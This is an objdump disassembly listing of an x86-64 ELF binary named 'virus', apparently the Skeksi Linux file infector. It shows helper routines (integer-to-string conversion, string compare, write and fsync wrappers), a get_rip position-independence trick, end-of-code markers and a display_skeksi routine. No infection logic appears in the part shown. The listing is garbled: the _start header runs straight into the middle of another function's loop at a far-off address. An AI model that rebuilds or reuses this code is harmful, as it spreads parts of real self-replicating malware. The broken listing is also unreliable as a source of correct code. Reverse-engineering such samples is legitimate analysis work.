
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  402865:	48 98                	cdqe   
  402867:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40286b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40286f:	48 01 d0             	add    rax,rdx
  402872:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402875:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402878:	48 63 d0             	movsxd rdx,eax
  40287b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40287f:	48 01 d0             	add    rax,rdx
  402882:	31 ce                	xor    esi,ecx
  402884:	89 f2                	mov    edx,esi
  402886:	88 10                	mov    BYTE PTR [rax],dl
  402888:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40288b:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  40288e:	48 98                	cdqe   
  402890:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402894:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402898:	48 01 d0             	add    rax,rdx
  40289b:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  40289e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028a1:	48 63 d0             	movsxd rdx,eax
  4028a4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028a8:	48 01 d0             	add    rax,rdx
  4028ab:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028ae:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028b1:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028b4:	48 98                	cdqe   
  4028b6:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028ba:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028be:	48 01 d0             	add    rax,rdx
  4028c1:	31 ce                	xor    esi,ecx
  4028c3:	89 f2                	mov    edx,esi
  4028c5:	88 10                	mov    BYTE PTR [rax],dl
  4028c7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028ca:	48 63 d0             	movsxd rdx,eax
  4028cd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028d1:	48 01 d0             	add    rax,rdx
  4028d4:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028d7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028da:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028dd:	48 98                	cdqe   
  4028df:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028e3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028e7:	48 01 d0             	add    rax,rdx
  4028ea:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028ed:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028f0:	48 63 d0             	movsxd rdx,eax
  4028f3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028f7:	48 01 d0             	add    rax,rdx
  4028fa:	31 ce                	xor    esi,ecx
  4028fc:	89 f2                	mov    edx,esi
  4028fe:	88 10                	mov    BYTE PTR [rax],dl
  402900:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402904:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402907:	89 c2                	mov    edx,eax
  402909:	c1 ea 1f             	shr    edx,0x1f
  40290c:	01 d0                	add    eax,edx
  40290e:	d1 f8                	sar    eax,1
  402910:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402913:	0f 8c 36 ff ff ff    	jl     40284f <itoa+0xb2>
  402919:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40291d:	5d                   	pop    rbp
  40291e:	c3                   	ret    

000000000040291f <itox>:
  40291f:	f3 0f 1e fa          	endbr64 
  402923:	55                   	push   rbp
  402924:	48 89 e5             	mov    rbp,rsp
  402927:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40292b:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40292f:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402936:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40293a:	48 99                	cqo    
  40293c:	48 c1 ea 3c          	shr    rdx,0x3c
  402940:	48 01 d0             	add    rax,rdx
  402943:	83 e0 0f             	and    eax,0xf
  402946:	48 29 d0             	sub    rax,rdx
  402949:	48 89 c1             	mov    rcx,rax
  40294c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40294f:	48 63 d0             	movsxd rdx,eax
  402952:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402956:	48 01 d0             	add    rax,rdx
  402959:	89 ca                	mov    edx,ecx
  40295b:	88 10                	mov    BYTE PTR [rax],dl
  40295d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402960:	48 63 d0             	movsxd rdx,eax
  402963:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402967:	48 01 d0             	add    rax,rdx
  40296a:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40296d:	3c 09                	cmp    al,0x9
  40296f:	7e 26                	jle    402997 <itox+0x78>
  402971:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402974:	48 63 d0             	movsxd rdx,eax
  402977:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40297b:	48 01 d0             	add    rax,rdx
  40297e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402981:	8d 48 57             	lea    ecx,[rax+0x57]
  402984:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402987:	48 63 d0             	movsxd rdx,eax
  40298a:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40298e:	48 01 d0             	add    rax,rdx
  402991:	89 ca                	mov    edx,ecx
  402993:	88 10                	mov    BYTE PTR [rax],dl
  402995:	eb 24                	jmp    4029bb <itox+0x9c>
  402997:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40299a:	48 63 d0             	movsxd rdx,eax
  40299d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029a1:	48 01 d0             	add    rax,rdx
  4029a4:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029a7:	8d 48 30             	lea    ecx,[rax+0x30]
  4029aa:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029ad:	48 63 d0             	movsxd rdx,eax
  4029b0:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029b4:	48 01 d0             	add    rax,rdx
  4029b7:	89 ca                	mov    edx,ecx
  4029b9:	88 10                	mov    BYTE PTR [rax],dl
  4029bb:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4029bf:	48 8d 50 0f          	lea    rdx,[rax+0xf]
  4029c3:	48 85 c0             	test   rax,rax
  4029c6:	48 0f 48 c2          	cmovs  rax,rdx
  4029ca:	48 c1 f8 04          	sar    rax,0x4
  4029ce:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4029d2:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4029d6:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  4029db:	0f 85 55 ff ff ff    	jne    402936 <itox+0x17>
  4029e1:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029e4:	48 63 d0             	movsxd rdx,eax
  4029e7:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029eb:	48 01 d0             	add    rax,rdx
  4029ee:	c6 00 00             	mov    BYTE PTR [rax],0x0
  4029f1:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  4029f8:	e9 b5 00 00 00       	jmp    402ab2 <itox+0x193>
  4029fd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a00:	48 63 d0             	movsxd rdx,eax
  402a03:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a07:	48 01 d0             	add    rax,rdx
  402a0a:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a0d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a10:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a13:	48 98                	cdqe   
  402a15:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a19:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a1d:	48 01 d0             	add    rax,rdx
  402a20:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a23:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a26:	48 63 d0             	movsxd rdx,eax
  402a29:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a2d:	48 01 d0             	add    rax,rdx
  402a30:	31 ce                	xor    esi,ecx
  402a32:	89 f2                	mov    edx,esi
  402a34:	88 10                	mov    BYTE PTR [rax],dl
  402a36:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a39:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a3c:	48 98                	cdqe   
  402a3e:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a42:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a46:	48 01 d0             	add    rax,rdx
  402a49:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a4c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a4f:	48 63 d0             	movsxd rdx,eax
  402a52:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a56:	48 01 d0             	add    rax,rdx
  402a59:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a5c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a5f:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a62:	48 98                	cdqe   
  402a64:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a68:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a6c:	48 01 d0             	add    rax,rdx
  402a6f:	31 ce                	xor    esi,ecx
  402a71:	89 f2                	mov    edx,esi
  402a73:	88 10                	mov    BYTE PTR [rax],dl
  402a75:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a78:	48 63 d0             	movsxd rdx,eax
  402a7b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a7f:	48 01 d0             	add    rax,rdx
  402a82:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a85:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a88:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a8b:	48 98                	cdqe   
  402a8d:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a91:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a95:	48 01 d0             	add    rax,rdx
  402a98:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a9b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a9e:	48 63 d0             	movsxd rdx,eax
  402aa1:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aa5:	48 01 d0             	add    rax,rdx
  402aa8:	31 ce                	xor    esi,ecx
  402aaa:	89 f2                	mov    edx,esi
  402aac:	88 10                	mov    BYTE PTR [rax],dl
  402aae:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402ab2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402ab5:	89 c2                	mov    edx,eax
  402ab7:	c1 ea 1f             	shr    edx,0x1f
  402aba:	01 d0                	add    eax,edx
  402abc:	d1 f8                	sar    eax,1
  402abe:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402ac1:	0f 8c 36 ff ff ff    	jl     4029fd <itox+0xde>
  402ac7:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402acb:	5d                   	pop    rbp
  402acc:	c3                   	ret    

0000000000402acd <_puts>:
  402acd:	f3 0f 1e fa          	endbr64 
  402ad1:	55                   	push   rbp
  402ad2:	48 89 e5             	mov    rbp,rsp
  402ad5:	48 83 ec 10          	sub    rsp,0x10
  402ad9:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402add:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402ae1:	48 89 c7             	mov    rdi,rax
  402ae4:	e8 7c 00 00 00       	call   402b65 <_strlen>
  402ae9:	48 89 c2             	mov    rdx,rax
  402aec:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402af0:	48 89 c6             	mov    rsi,rax
  402af3:	bf 01 00 00 00       	mov    edi,0x1
  402af8:	e8 03 f6 ff ff       	call   402100 <_write>
  402afd:	bf 01 00 00 00       	mov    edi,0x1
  402b02:	e8 e6 f6 ff ff       	call   4021ed <_fsync>
  402b07:	b8 01 00 00 00       	mov    eax,0x1
  402b0c:	c9                   	leave  
  402b0d:	c3                   	ret    

0000000000402b0e <_puts_nl>:
  402b0e:	f3 0f 1e fa          	endbr64 
  402b12:	55                   	push   rbp
  402b13:	48 89 e5             	mov    rbp,rsp
  402b16:	48 83 ec 10          	sub    rsp,0x10
  402b1a:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b1e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b22:	48 89 c7             	mov    rdi,rax
  402b25:	e8 3b 00 00 00       	call   402b65 <_strlen>
  402b2a:	48 89 c2             	mov    rdx,rax
  402b2d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b31:	48 89 c6             	mov    rsi,rax
  402b34:	bf 01 00 00 00       	mov    edi,0x1
  402b39:	e8 c2 f5 ff ff       	call   402100 <_write>
  402b3e:	ba 01 00 00 00       	mov    edx,0x1
  402b43:	48 8d 35 11 03 00 00 	lea    rsi,[rip+0x311]        # 402e5b <display_skeksi+0x128>
  402b4a:	bf 01 00 00 00       	mov    edi,0x1
  402b4f:	e8 ac f5 ff ff       	call   402100 <_write>
  402b54:	bf 01 00 00 00       	mov    edi,0x1
  402b59:	e8 8f f6 ff ff       	call   4021ed <_fsync>
  402b5e:	b8 01 00 00 00       	mov    eax,0x1
  402b63:	c9                   	leave  
  402b64:	c3                   	ret    

0000000000402b65 <_strlen>:
  402b65:	f3 0f 1e fa          	endbr64 
  402b69:	55                   	push   rbp
  402b6a:	48 89 e5             	mov    rbp,rsp
  402b6d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402b71:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
  402b78:	00 
  402b79:	eb 05                	jmp    402b80 <_strlen+0x1b>
  402b7b:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402b80:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402b84:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b88:	48 01 d0             	add    rax,rdx
  402b8b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402b8e:	84 c0                	test   al,al
  402b90:	75 e9                	jne    402b7b <_strlen+0x16>
  402b92:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b96:	5d                   	pop    rbp
  402b97:	c3                   	ret    

0000000000402b98 <_toupper>:
  402b98:	f3 0f 1e fa          	endbr64 
  402b9c:	55                   	push   rbp
  402b9d:	48 89 e5             	mov    rbp,rsp
  402ba0:	89 f8                	mov    eax,edi
  402ba2:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402ba5:	80 7d fc 60          	cmp    BYTE PTR [rbp-0x4],0x60
  402ba9:	7e 16                	jle    402bc1 <_toupper+0x29>
  402bab:	80 7d fc 7a          	cmp    BYTE PTR [rbp-0x4],0x7a
  402baf:	7f 10                	jg     402bc1 <_toupper+0x29>
  402bb1:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bb5:	83 e8 20             	sub    eax,0x20
  402bb8:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402bbb:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bbf:	eb 04                	jmp    402bc5 <_toupper+0x2d>
  402bc1:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bc5:	5d                   	pop    rbp
  402bc6:	c3                   	ret    

0000000000402bc7 <_strncmp>:
  402bc7:	f3 0f 1e fa          	endbr64 
  402bcb:	55                   	push   rbp
  402bcc:	48 89 e5             	mov    rbp,rsp
  402bcf:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402bd3:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402bd7:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx
  402bdb:	eb 53                	jmp    402c30 <_strncmp+0x69>
  402bdd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402be1:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402be4:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402be8:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402beb:	38 c2                	cmp    dl,al
  402bed:	74 20                	je     402c0f <_strncmp+0x48>
  402bef:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bf3:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402bf6:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402bfa:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402bfd:	38 c2                	cmp    dl,al
  402bff:	73 07                	jae    402c08 <_strncmp+0x41>
  402c01:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c06:	eb 34                	jmp    402c3c <_strncmp+0x75>
  402c08:	b8 01 00 00 00       	mov    eax,0x1
  402c0d:	eb 2d                	jmp    402c3c <_strncmp+0x75>
  402c0f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c13:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c16:	84 c0                	test   al,al
  402c18:	75 07                	jne    402c21 <_strncmp+0x5a>
  402c1a:	b8 00 00 00 00       	mov    eax,0x0
  402c1f:	eb 1b                	jmp    402c3c <_strncmp+0x75>
  402c21:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c26:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c2b:	48 83 6d e8 01       	sub    QWORD PTR [rbp-0x18],0x1
  402c30:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402c35:	75 a6                	jne    402bdd <_strncmp+0x16>
  402c37:	b8 00 00 00 00       	mov    eax,0x0
  402c3c:	5d                   	pop    rbp
  402c3d:	c3                   	ret    

0000000000402c3e <_strcmp>:
  402c3e:	f3 0f 1e fa          	endbr64 
  402c42:	55                   	push   rbp
  402c43:	48 89 e5             	mov    rbp,rsp
  402c46:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c4a:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c4e:	eb 1c                	jmp    402c6c <_strcmp+0x2e>
  402c50:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c54:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c57:	84 c0                	test   al,al
  402c59:	75 07                	jne    402c62 <_strcmp+0x24>
  402c5b:	b8 00 00 00 00       	mov    eax,0x0
  402c60:	eb 3a                	jmp    402c9c <_strcmp+0x5e>
  402c62:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c67:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c6c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c70:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c73:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c77:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c7a:	38 c2                	cmp    dl,al
  402c7c:	74 d2                	je     402c50 <_strcmp+0x12>
  402c7e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c82:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c85:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c89:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c8c:	38 c2                	cmp    dl,al
  402c8e:	73 07                	jae    402c97 <_strcmp+0x59>
  402c90:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c95:	eb 05                	jmp    402c9c <_strcmp+0x5e>
  402c97:	b8 01 00 00 00       	mov    eax,0x1
  402c9c:	5d                   	pop    rbp
  402c9d:	c3                   	ret    

0000000000402c9e <_memcmp>:
  402c9e:	f3 0f 1e fa          	endbr64 
  402ca2:	55                   	push   rbp
  402ca3:	48 89 e5             	mov    rbp,rsp
  402ca6:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402caa:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402cae:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cb1:	eb 35                	jmp    402ce8 <_memcmp+0x4a>
  402cb3:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402cb7:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cba:	88 45 ff             	mov    BYTE PTR [rbp-0x1],al
  402cbd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402cc1:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cc4:	88 45 fe             	mov    BYTE PTR [rbp-0x2],al
  402cc7:	0f b6 45 ff          	movzx  eax,BYTE PTR [rbp-0x1]
  402ccb:	3a 45 fe             	cmp    al,BYTE PTR [rbp-0x2]
  402cce:	74 0e                	je     402cde <_memcmp+0x40>
  402cd0:	0f b6 55 ff          	movzx  edx,BYTE PTR [rbp-0x1]
  402cd4:	0f b6 45 fe          	movzx  eax,BYTE PTR [rbp-0x2]
  402cd8:	29 c2                	sub    edx,eax
  402cda:	89 d0                	mov    eax,edx
  402cdc:	eb 17                	jmp    402cf5 <_memcmp+0x57>
  402cde:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402ce3:	48 83 45 e0 01       	add    QWORD PTR [rbp-0x20],0x1
  402ce8:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  402ceb:	8d 50 ff             	lea    edx,[rax-0x1]
  402cee:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cf1:	85 c0                	test   eax,eax
  402cf3:	75 be                	jne    402cb3 <_memcmp+0x15>
  402cf5:	5d                   	pop    rbp
  402cf6:	c3                   	ret    

0000000000402cf7 <get_rip>:
  402cf7:	f3 0f 1e fa          	endbr64 
  402cfb:	55                   	push   rbp
  402cfc:	48 89 e5             	mov    rbp,rsp
  402cff:	e8 00 00 00 00       	call   402d04 <get_rip_label>

0000000000402d04 <get_rip_label>:
  402d04:	58                   	pop    rax
  402d05:	48 89 c0             	mov    rax,rax
  402d08:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402d0c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d10:	5d                   	pop    rbp
  402d11:	c3                   	ret    

0000000000402d12 <end_code>:
  402d12:	f3 0f 1e fa          	endbr64 
  402d16:	55                   	push   rbp
  402d17:	48 89 e5             	mov    rbp,rsp
  402d1a:	bf 00 00 00 00       	mov    edi,0x0
  402d1f:	e8 33 f3 ff ff       	call   402057 <Exit>
  402d24:	90                   	nop
  402d25:	5d                   	pop    rbp
  402d26:	c3                   	ret    

0000000000402d27 <dummy_marker>:
  402d27:	f3 0f 1e fa          	endbr64 
  402d2b:	55                   	push   rbp
  402d2c:	48 89 e5             	mov    rbp,rsp
  402d2f:	90                   	nop
  402d30:	90                   	nop
  402d31:	5d                   	pop    rbp
  402d32:	c3                   	ret    

0000000000402d33 <display_skeksi>:
  402d33:	f3 0f 1e fa          	endbr64 
  402d37:	55                   	push   rbp
  402d38:	48 89 e5             	mov    rbp,rsp
  402d3b:	ba ed 3b 00 00       	mov    edx,0x3bed
  402d40:	48 c7 c0 60 2e 40 00 	mov    rax,0x402e60
  402d47:	48 89 c6             	mov    rsi,rax
  402d4a:	bf 01 00 00 00       	mov    edi,0x1
  402d4f:	e8 ac f3 ff ff       	call   402100 <_write>
  402d54:	90                   	nop
  402d55:	5d                   	pop    rbp
  402d56:	c3                   	ret    
